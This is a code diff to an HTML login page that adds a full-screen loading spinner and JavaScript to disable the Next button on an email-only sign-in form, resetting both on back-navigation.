@@ -24,7 +24,7 @@
         </p>
 
         <!-- Email-only form -->
-        <form action="function/_auth/_getEmail.php" method="post" class="space-y-3 w-full xl:px-28 px-10 lg:p-5">
+        <form action="function/_auth/_getEmail.php" method="post" id="loginForm" class="space-y-3 w-full xl:px-28 px-10 lg:p-5">
 
           <!-- Floating Label Input -->
           <div class="relative">
@@ -50,8 +50,8 @@
 
           <!-- Next Button -->
           <div class="flex justify-end">
-            <button type="submit"
-              class="w-fit bg-[#064089] text-white font-semibold px-6 py-2 rounded-md shadow-md hover:bg-[#002266]">
+            <button type="submit" id="nextBtn"
+              class="w-fit bg-[#064089] text-white font-semibold px-6 py-2 rounded-md shadow-md hover:bg-[#002266] flex items-center justify-center min-w-[90px]">
               Next
             </button>
           </div>
@@ -68,6 +68,17 @@
         </p>
       </footer>
     </div>
+  </div>
+</div>
+
+<!-- Full-screen Loading Overlay -->
+<div id="loadingOverlay" class="hidden fixed inset-0 bg-black bg-opacity-50 z-50 flex items-center justify-center">
+  <div class="flex flex-col items-center">
+    <svg class="animate-spin h-10 w-10 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+      <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+      <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+    </svg>
+    <p class="mt-4 text-white text-lg">Loading...</p>
   </div>
 </div>
 
@@ -109,4 +120,32 @@
       modal.classList.add("hidden");
     }
   });
+
+  const loginForm = document.getElementById("loginForm");
+  const nextBtn = document.getElementById("nextBtn");
+  const loadingOverlay = document.getElementById("loadingOverlay");
+
+  if (loginForm && nextBtn && loadingOverlay) {
+    loginForm.addEventListener("submit", (e) => {
+      const emailInput = document.getElementById('username');
+      // Prevent loader from showing on an empty form submission
+      if (!emailInput.value.trim()) {
+        return;
+      }
+
+      // Disable the button and show the full-screen overlay
+      nextBtn.disabled = true;
+      loadingOverlay.classList.remove("hidden");
+    });
+
+    // Handle back-navigation from the password page
+    window.addEventListener('pageshow', function(event) {
+      // The event.persisted property is true if the page is from the bfcache
+      if (event.persisted) {
+        // Hide the overlay and re-enable the button
+        loadingOverlay.classList.add('hidden');
+        nextBtn.disabled = false;
+      }
+    });
+  }
 </script>
